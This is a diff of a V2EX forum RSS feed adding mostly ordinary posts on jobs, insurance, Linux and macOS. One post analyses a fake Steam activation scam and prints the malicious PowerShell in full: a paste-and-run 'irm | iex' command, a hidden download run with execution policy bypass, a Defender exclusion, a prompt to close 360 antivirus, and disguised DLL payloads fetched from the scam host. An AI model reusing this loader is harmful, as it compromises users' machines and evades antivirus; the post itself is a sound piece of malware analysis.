@@ -1,5 +1,180 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/"><channel><title>V2EX</title><link>https://www.v2ex.com/</link><description>way to explore</description><lastBuildDate>Thu, 15 Feb 2024 14:27:11 GMT</lastBuildDate><generator>rfeed v1.1.1</generator><docs>https://github.com/svpino/rfeed/blob/master/README.md</docs><item><title>[酷工作] [成都/远程] [ Java ] [15-30k] 诚招中、高级 Java 后端开发，可远程</title><link>https://www.v2ex.com/t/1015779#reply0</link><description>&lt;h4&gt;新加坡电商平台项目，诚招中、高级 java 后端开发 1~2 名。&lt;/h4&gt;
+<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/"><channel><title>V2EX</title><link>https://www.v2ex.com/</link><description>way to explore</description><lastBuildDate>Thu, 15 Feb 2024 17:24:10 GMT</lastBuildDate><generator>rfeed v1.1.1</generator><docs>https://github.com/svpino/rfeed/blob/master/README.md</docs><item><title>[问与答] 请教一个在 nodejs 下模拟终端环境运行一些仅在终端下运行的指令问题</title><link>https://www.v2ex.com/t/1015789#reply0</link><description>&lt;p&gt;各位大佬，请教一个问题，我想在 nodejs 环境下运行 nvm for windows 的指令，但是在 nvm 最近更新的版本里，发现新增了终端检测代码：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;if !isTerminal() {
+		alert("NVM for Windows should be run from a terminal such as CMD or PowerShell.", "Terminal Only")
+		os.Exit(0)
+	}
+
+	// Capture any additional arguments
+	if len(args) &amp;gt; 2 {
+		detail = args[2]
+@@ -180,6 +185,102 @@ func setNpmMirror(uri string) {
+	saveSettings()
+}
+
+func isTerminal() bool {
+	fileInfo, err := os.Stdout.Stat()
+	if err != nil {
+		return false
+	}
+	return (fileInfo.Mode() &amp;amp; os.ModeCharDevice) != 0
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;请问我可以绕开这个检测吗&lt;/p&gt;</description><pubDate>Thu, 15 Feb 2024 17:22:06 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015789#reply0</guid></item><item><title>[Steam] steam 假激活的玩意分析</title><link>https://www.v2ex.com/t/1015787#reply3</link><description>&lt;p&gt;pdd 店家假激活要求输入这个命令&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;irm steam.*** | iex 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;尝试浏览器直接访问这个 steam 网站，直接跳转到了真 steam 思路错误 然后把管道符号|去掉 发现拉去的还是 html ，发现有些不对，于是把&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;irm steam.*** 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;的玩意全部一股脑扔进 vscode 然后折叠 html 发现了这个玩意&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+#&amp;gt;
+
+irm steam.***/pwsDwFile/new -OutFile x.ps1
+
+powershell.exe -ExecutionPolicy Bypass -File x.ps1;
+
+&amp;lt;#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;使用 powershell 绕过执行策略的限制
+这里我最开始没发现问题，看了半天 html 都快傻眼了，代码还能混淆进 html ？最后反向思考肯定得用 powershell 才能执行接下来的脚本，于是搜搜 powershell 关键字给我找出来上面那两玩意，前面那句居然是藏在 html 里面的，后面那句没有隐藏，vscode 折叠一下就看见 powershell 了
+继续跟进 x.ps1&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;cls
+
+$filePathToDelete = Join-Path $env:USERPROFILE "x.ps1"
+ if (Test-Path $filePathToDelete) {
+    Remove-Item -Path $filePathToDelete
+}
+$desktopFilePathToDelete = Join-Path ([System.Environment]::GetFolderPath('Desktop')) "x.ps1"
+if (Test-Path $desktopFilePathToDelete) {
+    Remove-Item -Path $desktopFilePathToDelete
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;把自己删了&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$steamRegPath = 'HKCU:\Software\Valve\Steam'
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;搜搜 steam&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$localPath = -join ($env:LOCALAPPDATA,"\SteamActive")
+if ((Test-Path $steamRegPath)) {
+    $properties = Get-ItemProperty -Path $steamRegPath
+    if ($properties.PSObject.Properties.Name -contains 'SteamPath') {
+        $steamPath = $properties.SteamPath
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;让用户关掉授权&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Write-Host "[请重新打开 Power shell 打开方式以管理员身份运行]" -ForegroundColor:red
+    exit
+}
+
+function PwStart() {
+    if(Get-Process "360Tray*" -ErrorAction Stop){
+        while(Get-Process 360Tray* -ErrorAction Stop){
+            Write-Host "[请先退出 360 安全卫士]" -ForegroundColor:Red
+            Start-Sleep 1.5
+        }
+        PwStart
+
+    }
+    if(Get-Process "360sd*" -ErrorAction Stop)
+    {
+        while(Get-Process 360sd* -ErrorAction Stop){
+            Write-Host "[请先退出 360 杀毒]" -ForegroundColor:Red
+            Start-Sleep 1.5
+        }
+        PwStart
+    }
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这句话很奇怪，实际上虚拟机里面没有 steam 并没有执行？&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    if ($steamPath -eq ""){
+        Write-Host "[请检查您的 Steam 是否正确安装]" -ForegroundColor:Red
+        exit
+    }
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;关掉 steam&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    Write-Host "[ServerStart        OK]" -ForegroundColor:green
+    Stop-Process -Name steam* -Force -ErrorAction Stop
+    Start-Sleep 2
+    if(Get-Process steam* -ErrorAction Stop){
+        TASKKILL /F /IM "steam.exe" | Out-Null
+        Start-Sleep 2
+    }
+
+    if (!(Test-Path $localPath)) {
+        md $localPath | Out-Null
+        if (!(Test-Path $localPath)) {
+            New-Item $localPath -ItemType directory -Force | Out-Null
+        }
+    }
+
+    $catchPath = -join ($steamPath,"\package\data")
+    if ((Test-Path $catchPath)) {
+        if ((Test-Path $catchPath)) {
+            Remove-Item $catchPath -Recurse -Force | Out-Null
+        }
+    }
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;添加免杀&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    try{
+        Add-MpPreference -ExclusionPath $steamPath -ErrorAction Stop
+        Start-Sleep 3
+    }catch{}
+
+    Write-Host "[Result-&amp;gt;0          OK]" -ForegroundColor:green
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;删掉其他家的 dll ？&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    try{
+        $d = $steamPath + "/version.dll"
+        if (Test-Path $d) {
+            Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null #清除文件
+        }
+        $d = $steamPath + "/user32.dll"
+        if (Test-Path $d) {
+            Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null #清除文件
+        }
+        $d = $steamPath + "/hid.dll"
+        if (Test-Path $d) {
+            Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null #清除文件
+        }
+    }catch{
+        Write-Host "[异常残留请检查[$d]文件是否异常!]" -ForegroundColor:red
+        exit
+    }
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;下 pdf 假装？话说老哥们有啥可以刷网络的工具么，其实我有点想刷上一波把他 cdn 刷干净，但是限速 2m 并且单 ip 限 1 个线程&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    $downloadData = "http://steam.***/pwsDwFile/bcfc1e52ca77ad82122dfe4c9560f3ec.pdf"
+    $downloadLink = "http://steam.***/pwsDwFile/9b96dab2bb0ba18d56068fabc5b17185.pdf"
+    
+    irm -Uri $downloadLink -OutFile $d -ErrorAction Stop
+    Write-Host "[Result-&amp;gt;1          OK]" -ForegroundColor:green
+    $d = $localPath + "/hid"
+    irm -Uri $downloadData -OutFile $d -ErrorAction Stop
+    Write-Host "[Result-&amp;gt;2          OK]" -ForegroundColor:green
+    
+    Start-Sleep 1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;重新打开 steam&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    Start steam://
+    Write-Host "[连接服务器成功请在 Steam 输入激活码 3 秒后自动关闭]" -ForegroundColor:green
+    Start-Sleep 3
+    exit
+|
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;整体看下来就是给 steam 添加了两个文件，可是看起来并没有进行注入什么的啊，我理解就需要 dll 时候是先拉文件目录内的 dll 进行执行？这样才能解释为啥就是只添加了两个文件？&lt;/p&gt;</description><pubDate>Thu, 15 Feb 2024 16:54:12 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015787#reply3</guid></item><item><title>[奇思妙想] 在中国实现婚前协议分配共有财产和婚后收入可行吗</title><link>https://www.v2ex.com/t/1015786#reply3</link><description>&lt;p&gt;婚前协议在中国有效吗，有替代方案吗？&lt;/p&gt;
+&lt;p&gt;比如房产权利按比例，每年转移一部分；婚后收入只有固定比例作为共有收入。。。&lt;/p&gt;</description><pubDate>Thu, 15 Feb 2024 16:16:33 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015786#reply3</guid></item><item><title>[Next.js] 他强由他强，清风拂山岗</title><link>https://www.v2ex.com/t/1015785#reply2</link><description>&lt;p&gt;偷窥了一下隔壁组的代码，nextjs13 版本，还上了 app router ，然后再往下看每一个 page.tsx 最上边都是一行“use client”。。。&lt;/p&gt;</description><pubDate>Thu, 15 Feb 2024 16:10:10 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015785#reply2</guid></item><item><title>[问与答] 百万医疗 60 岁后价格翻倍正常么?</title><link>https://www.v2ex.com/t/1015784#reply4</link><description>&lt;p&gt;父母去年都满 60 周岁了.&lt;br /&gt;
+一直买的支付宝的好医保, 6 年续费版本的.&lt;br /&gt;
+这个月续费, 每个月付款从 134.2 涨到 213.04 了.
+我之前一直以为费用是固定不变的.&lt;br /&gt;
+没想到一下子翻倍了.&lt;br /&gt;
+有点不知所谓, 是所有百万医疗都会这样么?&lt;/p&gt;</description><pubDate>Thu, 15 Feb 2024 16:08:46 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015784#reply4</guid></item><item><title>[问与答] 淘宝买的 openai API 如何转原生？</title><link>https://www.v2ex.com/t/1015782#reply1</link><description>Readwise Reader 中 Integretions 仅支持 openai 的原生 API ，对于淘宝买的需要中转的 API ，有没有开源项目可以让其转成原生的 API ，并且可以直接填入 readwise reader 里面？</description><pubDate>Thu, 15 Feb 2024 15:13:18 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015782#reply1</guid></item><item><title>[宽带症候群] 湖北移动骨干炸了？？</title><link>https://www.v2ex.com/t/1015781#reply1</link><description>&lt;p&gt;&lt;a href="https://img2.imgtp.com/2024/02/15/qYcTdLIp.PNG" rel="nofollow"&gt;https://img2.imgtp.com/2024/02/15/qYcTdLIp.PNG&lt;/a&gt;
+咋延迟这么高&lt;/p&gt;</description><pubDate>Thu, 15 Feb 2024 15:03:05 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015781#reply1</guid></item><item><title>[生活] 彩礼的意义和归属</title><link>https://www.v2ex.com/t/1015780#reply13</link><description>&lt;p&gt;过年第一次去女朋友家，安徽阜阳这边，女朋友她妈直接当着她们一家人问打算给多少彩礼，说几年前大女儿当时给了 12w...&lt;/p&gt;
+&lt;p&gt;一下子尬在饭桌上，想这好几年了意思是要涨一点？ 14w 不好听吧，就说了 16w.&lt;/p&gt;
+&lt;p&gt;吃完饭有点无语，问了女朋友说她姐当时是给了这么多，而且基本是有来无回，只有象征性的嫁妆作为回礼(一般一床一千多的被子)&lt;/p&gt;
+&lt;hr /&gt;
+&lt;p&gt;彩礼这东西，是给女方家长的，还是给女方的？想不明白为什么有这东西的存在。过去是嫁出去的女儿远离父母，但现在都在大城市打工，离她家还近一点，每年回去的次数也多。这和卖女儿有什么区别&lt;/p&gt;
+&lt;p&gt;和同事讨论，他说他们那地方彩礼只是走个过场，给多少，女方还会加一些还回来，那这种情况彩礼高低还有啥现实讨论意义。&lt;/p&gt;</description><pubDate>Thu, 15 Feb 2024 14:44:35 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015780#reply13</guid></item><item><title>[酷工作] [成都/远程] [ Java ] [15-30k] 诚招中、高级 Java 后端开发，可远程</title><link>https://www.v2ex.com/t/1015779#reply0</link><description>&lt;h4&gt;新加坡电商平台项目，诚招中、高级 java 后端开发 1~2 名。&lt;/h4&gt;
 &lt;h4&gt;一、岗位职责&lt;/h4&gt;
 &lt;p&gt;• 理解业务需求，根据需求文档进行数据表设计，业务逻辑开发；&lt;/p&gt;
 &lt;p&gt;• 负责完成接口文档编写和更新；&lt;/p&gt;
@@ -22,7 +197,7 @@
 &lt;p&gt;• 面试方式：同城线下/视频面试，面试轮数：1-2 轮。&lt;/p&gt;
 &lt;h4&gt;五、联系方式 （请删除邮箱和 wx 中的短横线-）&lt;/h4&gt;
 &lt;p&gt;• wx: g-o-n-g-x-l-e-i&lt;/p&gt;
-&lt;p&gt;• 投递邮箱：&lt;a href="mailto:s-c-c-r-i-t@163.com"&gt;s-c-c-r-i-t@163.com&lt;/a&gt;&lt;/p&gt;</description><pubDate>Thu, 15 Feb 2024 14:25:13 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015779#reply0</guid></item><item><title>[Windows] win11 登录账户解锁前完成应用程序自启</title><link>https://www.v2ex.com/t/1015778#reply0</link><description>&lt;p&gt;无意中踩了个坑，而且还很抽象。&lt;/p&gt;
+&lt;p&gt;• 投递邮箱：&lt;a href="mailto:s-c-c-r-i-t@163.com"&gt;s-c-c-r-i-t@163.com&lt;/a&gt;&lt;/p&gt;</description><pubDate>Thu, 15 Feb 2024 14:25:13 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015779#reply0</guid></item><item><title>[Windows] win11 登录账户解锁前完成应用程序自启</title><link>https://www.v2ex.com/t/1015778#reply2</link><description>&lt;p&gt;无意中踩了个坑，而且还很抽象。&lt;/p&gt;
 &lt;p&gt;win11 （ win10 及以前的不知道）设置里有个选项&lt;strong&gt;“使用我的登录信息在更新后自动完成设置”&lt;/strong&gt;，在&lt;strong&gt;账户&amp;gt;登录选项&lt;/strong&gt;里，开启后可以实现开机系统自动登录上次的账户，完成所有程序的开机自启，再自动锁定。而且并不需要等程序启动完成再锁定，是异步的，所有开机后往往会看见登录屏幕闪一下，那就是自动登录又马上锁定，程序就在后台慢慢自启。&lt;/p&gt;
 &lt;p&gt;windows 的自启有很多实现方式，服务、计划任务、组策略、注册表、启动文件夹，等等，不同的程序往往可能选用不同的方式，所以在任务管理器的启动栏和设置的自启应用里面看到的不一定是全部，管家类程序能检测到的会更全一些，但也不一定是全部。&lt;/p&gt;
 &lt;p&gt;用户如果想手动设一个应用开机自启，最简单的方式是把快捷方式丢到启动文件夹里面，也就是&lt;code&gt;win+r&lt;/code&gt;输入&lt;code&gt;shell:startup&lt;/code&gt;打开的文件夹，但这种方式设置的程序在用户登录，也就是输入密码之后才会自启。如果想开机就自启，往往需要创建一个合理设置的计划任务，但这种方式又不适用于 GUI 程序，一般都是命令行程序或 bat 脚本；或者用 winsw 包装成服务。而且不管怎么说，一个程序就要对应操作一轮，比较麻烦。这是不登录情况下的解决办法。&lt;/p&gt;
@@ -30,7 +205,7 @@
 &lt;p&gt;什么问题呢？这个&lt;strong&gt;加强隐私&lt;/strong&gt;是个复合设置项，同时会修改多个设置，其中包含了 win11 设置的&lt;strong&gt;隐私和安全性&amp;gt;诊断和反馈&amp;gt;诊断数据&lt;/strong&gt;，而从组策略层级禁用这个&lt;strong&gt;诊断数据&lt;/strong&gt;会不知为何导致&lt;strong&gt;使用我的登录信息在更新后自动完成设置&lt;/strong&gt;的界面变为&lt;em&gt;“其中一些设置由你的组织管理”&lt;/em&gt;并强制禁用，也就是设置变灰无法更改。更为奇怪的是，手动去组策略管理器里面根本找不到修改项，不知道 optimizer 是怎么实现的，或者 win11 设置界面只是统一显示&lt;em&gt;“其中一些设置由你的组织管理”&lt;/em&gt;，实际上修改的内容并非如此。&lt;/p&gt;
 &lt;p&gt;题外话，勾选这个设置还会导致就近共享不能用，虽然有详情说明，因为那糟糕的翻译我一开始也没反应过来。&lt;/p&gt;
 &lt;p&gt;解决方法也很简单，把勾选的勾掉，再去设置里面确认，果然隐私诊断数据和登录自启都恢复了。&lt;/p&gt;
-&lt;p&gt;所以说，真的是能用就别乱改，不懂原理和细节就别乱玩，当时候坑的还是自己。windows 表面上的同一个功能可能会有复数个设置对应，它们之间可能是“与”的关系，也可能是“或”的关系，还可能有不同的优先级。win10 和 win11 的新版设置，老版的控制面板，注册表，组策略管理器，最喜闻乐见的当然是改一处其他地方一起变，但很多时候某个设置是某个地方独占的或者独立的，这种情况就需要仔细斟酌了。&lt;/p&gt;</description><pubDate>Thu, 15 Feb 2024 14:24:10 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015778#reply0</guid></item><item><title>[优惠信息] 公益 GPT4</title><link>https://www.v2ex.com/t/1015777#reply0</link><description>&lt;a href="https://allenyy.com" rel="nofollow noopener" target="_blank"&gt;https://allenyy.com&lt;/a&gt;&lt;br /&gt;免费 GPT4 ，GPT3.5 ，注册送 20 美元额度，邀请人各送 20 美元额度</description><pubDate>Thu, 15 Feb 2024 14:16:17 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015777#reply0</guid></item><item><title>[Linux] Linux 是如何隐藏`DIR`结构体定义的</title><link>https://www.v2ex.com/t/1015775#reply2</link><description>&lt;p&gt;最近在看 APUE 时遇到了&lt;code&gt;DIR&lt;/code&gt;，提到了由于不同的实现，解析目录文件内容方式不统一，通常会阻止直接读取目录文件的内容&lt;/p&gt;
+&lt;p&gt;所以说，真的是能用就别乱改，不懂原理和细节就别乱玩，当时候坑的还是自己。windows 表面上的同一个功能可能会有复数个设置对应，它们之间可能是“与”的关系，也可能是“或”的关系，还可能有不同的优先级。win10 和 win11 的新版设置，老版的控制面板，注册表，组策略管理器，最喜闻乐见的当然是改一处其他地方一起变，但很多时候某个设置是某个地方独占的或者独立的，这种情况就需要仔细斟酌了。&lt;/p&gt;</description><pubDate>Thu, 15 Feb 2024 14:24:10 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015778#reply2</guid></item><item><title>[优惠信息] 公益 GPT4</title><link>https://www.v2ex.com/t/1015777#reply4</link><description>&lt;a href="https://allenyy.com" rel="nofollow noopener" target="_blank"&gt;https://allenyy.com&lt;/a&gt;&lt;br /&gt;免费 GPT4 ，GPT3.5 ，注册送 20 美元额度，邀请人各送 20 美元额度</description><pubDate>Thu, 15 Feb 2024 14:16:17 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015777#reply4</guid></item><item><title>[Linux] Linux 是如何隐藏`DIR`结构体定义的</title><link>https://www.v2ex.com/t/1015775#reply5</link><description>&lt;p&gt;最近在看 APUE 时遇到了&lt;code&gt;DIR&lt;/code&gt;，提到了由于不同的实现，解析目录文件内容方式不统一，通常会阻止直接读取目录文件的内容&lt;/p&gt;
 &lt;pre&gt;&lt;code class="language-c"&gt;DIR *opendir (const char *name)
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;跳转到&lt;code&gt;DIR&lt;/code&gt;的定义&lt;/p&gt;
@@ -63,7 +238,7 @@ typedef struct __dirstream DIR;
 
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;并没有找到&lt;code&gt;__dirstream&lt;/code&gt;的定义&lt;/p&gt;
-&lt;p&gt;所以是如何实现隐藏定义的？&lt;/p&gt;</description><pubDate>Thu, 15 Feb 2024 14:08:43 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015775#reply2</guid></item><item><title>[职场话题] 坐标南京 offer 选择问题，求大佬指点</title><link>https://www.v2ex.com/t/1015774#reply2</link><description>&lt;p&gt;各位大佬，我 7 年经验程序员，安全开发方向，因为家庭原因准备今年去南京工作生活，目前手里 2 个 offer ，不太了解南京这边行情，请大家帮忙分析下&lt;/p&gt;
+&lt;p&gt;所以是如何实现隐藏定义的？&lt;/p&gt;</description><pubDate>Thu, 15 Feb 2024 14:08:43 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015775#reply5</guid></item><item><title>[职场话题] 坐标南京 offer 选择问题，求大佬指点</title><link>https://www.v2ex.com/t/1015774#reply3</link><description>&lt;p&gt;各位大佬，我 7 年经验程序员，安全开发方向，因为家庭原因准备今年去南京工作生活，目前手里 2 个 offer ，不太了解南京这边行情，请大家帮忙分析下&lt;/p&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -103,7 +278,7 @@ typedef struct __dirstream DIR;
 &lt;td&gt;离家远，工作日开车要 1.5 小时&lt;/td&gt;
 &lt;td&gt;五险一金按照最低系数交&lt;/td&gt;
 &lt;/tr&gt;
-&lt;/tbody&gt;&lt;/table&gt;</description><pubDate>Thu, 15 Feb 2024 14:06:21 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015774#reply2</guid></item><item><title>[酷工作] [成都/远程] [react] [12-22k] 诚招中、高级前端开发，可远程</title><link>https://www.v2ex.com/t/1015773#reply0</link><description>&lt;h4&gt;新加坡电商平台项目，诚招中、高级 react 前端开发 1 名。&lt;/h4&gt;
+&lt;/tbody&gt;&lt;/table&gt;</description><pubDate>Thu, 15 Feb 2024 14:06:21 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015774#reply3</guid></item><item><title>[酷工作] [成都/远程] [react] [12-22k] 诚招中、高级前端开发，可远程</title><link>https://www.v2ex.com/t/1015773#reply0</link><description>&lt;h4&gt;新加坡电商平台项目，诚招中、高级 react 前端开发 1 名。&lt;/h4&gt;
 &lt;h4&gt;一、岗位职责&lt;/h4&gt;
 &lt;p&gt;• 理解业务需求，根据已有的 UI 图进行页面开发；&lt;/p&gt;
 &lt;p&gt;• 负责集成后端接口，并反馈接口问题；&lt;/p&gt;
@@ -124,10 +299,10 @@ typedef struct __dirstream DIR;
 &lt;p&gt;• 面试方式：同城线下/视频面试，面试轮数：1-2 轮。&lt;/p&gt;
 &lt;h4&gt;五、联系方式 （请删除邮箱和 wx 中的短横线-）&lt;/h4&gt;
 &lt;p&gt;• wx: g-o-n-g-x-l-e-i&lt;/p&gt;
-&lt;p&gt;• 投递邮箱：&lt;a href="mailto:s-c-c-r-i-t@163.com"&gt;s-c-c-r-i-t@163.com&lt;/a&gt;&lt;/p&gt;</description><pubDate>Thu, 15 Feb 2024 13:53:43 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015773#reply0</guid></item><item><title>[Apple] macOS 14 上切换输入法有延迟（不是 CapsLock），求好的解决方案。</title><link>https://www.v2ex.com/t/1015772#reply2</link><description>&lt;p&gt;&lt;strong&gt;系统：&lt;/strong&gt;最新的 macOS 14.3.1&lt;/p&gt;
+&lt;p&gt;• 投递邮箱：&lt;a href="mailto:s-c-c-r-i-t@163.com"&gt;s-c-c-r-i-t@163.com&lt;/a&gt;&lt;/p&gt;</description><pubDate>Thu, 15 Feb 2024 13:53:43 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015773#reply0</guid></item><item><title>[Apple] macOS 14 上切换输入法有延迟（不是 CapsLock），求好的解决方案。</title><link>https://www.v2ex.com/t/1015772#reply6</link><description>&lt;p&gt;&lt;strong&gt;系统：&lt;/strong&gt;最新的 macOS 14.3.1&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;硬件：&lt;/strong&gt;Macbook Pro M1 2020 16GB RAM&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;问题：&lt;/strong&gt;我平常有四种语言的输入法，经常需要多语言切换（中英日韩），每一种语言对应了不同的输入法。但是日常使用的时候发现，有的时候这个小小的输入法标识已经变成了对应的输入法，但是敲击键盘输入进去的却不是对应的文字……得重新多切换两遍才管用。&lt;/p&gt;
-&lt;p&gt;这个问题或许不是 macOS 14 上才出现的，但这个版本绝对把这个问题加重了很多。我搜索了一下好像之前没有讨论这个的帖子，所以想请教一下，不知道这个问题有什么解决办法？&lt;/p&gt;</description><pubDate>Thu, 15 Feb 2024 13:51:34 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015772#reply2</guid></item><item><title>[问与答] 200¥能买到一个性能不错的二手迷你小主机么？</title><link>https://www.v2ex.com/t/1015771#reply0</link><description>&lt;p&gt;只要用来安装 owncloud 家庭存储，会用 usb 外接一个大容量硬盘，对硬件配置大概的希望是&lt;/p&gt;
+&lt;p&gt;这个问题或许不是 macOS 14 上才出现的，但这个版本绝对把这个问题加重了很多。我搜索了一下好像之前没有讨论这个的帖子，所以想请教一下，不知道这个问题有什么解决办法？&lt;/p&gt;</description><pubDate>Thu, 15 Feb 2024 13:51:34 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015772#reply6</guid></item><item><title>[问与答] 200¥能买到一个性能不错的二手迷你小主机么？</title><link>https://www.v2ex.com/t/1015771#reply3</link><description>&lt;p&gt;只要用来安装 owncloud 家庭存储，会用 usb 外接一个大容量硬盘，对硬件配置大概的希望是&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;CPU 双核以上的，主频 1.5GHz 以上的。低功耗则最好。&lt;/li&gt;
 &lt;li&gt;内存不低于 4G.&lt;/li&gt;
@@ -136,7 +311,7 @@ typedef struct __dirstream DIR;
 &lt;li&gt;带 2 个及以上 USB 3.0 接口。&lt;/li&gt;
 &lt;li&gt;主机尺寸越小越好，不强求。&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;这样的配置，200¥能买到么？不挑牌子，但求稳定。&lt;/p&gt;</description><pubDate>Thu, 15 Feb 2024 13:35:27 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015771#reply0</guid></item><item><title>[程序员] 请教一个内容可变分块（Content Defined Chunk, CDC）后合并文件与源文件不符的问题</title><link>https://www.v2ex.com/t/1015770#reply0</link><description>&lt;p&gt;最近在做一个跟网络存储有关的项目涉及到 CDC ，目前比较主流的算法除了前几年新提出的 FastCDC 以外就是基于拉宾卡普算法的 Rabin CDC ，其基本思想是计算拉宾指纹并根据滚动哈希进行分块。目前比较典型的成熟应用就是海文的 Seafile ，它的后端使用的是 Rabin CDC 并且网络上有很多针对其源代码的分析，例如：
+&lt;p&gt;这样的配置，200¥能买到么？不挑牌子，但求稳定。&lt;/p&gt;</description><pubDate>Thu, 15 Feb 2024 13:35:27 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015771#reply3</guid></item><item><title>[程序员] 请教一个内容可变分块（Content Defined Chunk, CDC）后合并文件与源文件不符的问题</title><link>https://www.v2ex.com/t/1015770#reply0</link><description>&lt;p&gt;最近在做一个跟网络存储有关的项目涉及到 CDC ，目前比较主流的算法除了前几年新提出的 FastCDC 以外就是基于拉宾卡普算法的 Rabin CDC ，其基本思想是计算拉宾指纹并根据滚动哈希进行分块。目前比较典型的成熟应用就是海文的 Seafile ，它的后端使用的是 Rabin CDC 并且网络上有很多针对其源代码的分析，例如：
 [1] &lt;a href="http://www.ilovecpp.com/2019/02/03/cdc/" rel="nofollow"&gt;http://www.ilovecpp.com/2019/02/03/cdc/&lt;/a&gt;
 [2] &lt;a href="https://blog.csdn.net/cyk0620/article/details/120813255" rel="nofollow"&gt;https://blog.csdn.net/cyk0620/article/details/120813255&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;我也找到了一个 Github 仓库基本上是把 Seafile 的分块部分单独拿出来做了个主程序的实现：
@@ -321,10 +496,4 @@ void file_merge_cdc(CDCFileDescriptor* file_desc)
         }
     }
 &lt;/code&gt;&lt;/pre&gt;
-&lt;pre&gt;&lt;code&gt;&lt;/code&gt;&lt;/pre&gt;</description><pubDate>Thu, 15 Feb 2024 13:21:57 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015770#reply0</guid></item><item><title>[iPhone] 在国外使用 ios 自带地图时发生了不少笑话</title><link>https://www.v2ex.com/t/1015769#reply0</link><description>例如，今天用“查找”查看我妈在国内的位置，因为在国外网络环境下 ios 自带地图的中国部分数据是缺失的，我妈的位置落在地图上是一条施工中的道路，地图上这条道路标注为“在建”，于是 iOS 直接说我妈当前所处的位置叫做“在建”。&lt;br /&gt;&lt;br /&gt;又由于我妈正好坐在车上（实际上这条路已经通车，地图数据缺失而已），于是 iOS 画了一个开车的符号。&lt;br /&gt;&lt;br /&gt;一个人开车在一条“在建”的路上，这是神仙啊&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;a href="https://i.imgur.com/tyZ2Zrs.jpeg" rel="nofollow noopener" target="_blank"&gt;&lt;img class="embedded_image" rel="noreferrer" src="https://i.imgur.com/tyZ2Zrs.jpeg" /&gt;&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;a href="https://i.imgur.com/qapteup.jpeg" rel="nofollow noopener" target="_blank"&gt;&lt;img class="embedded_image" rel="noreferrer" src="https://i.imgur.com/qapteup.jpeg" /&gt;&lt;/a&gt;</description><pubDate>Thu, 15 Feb 2024 13:04:58 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015769#reply0</guid></item><item><title>[问与答] 有对比过笔记本 LTE 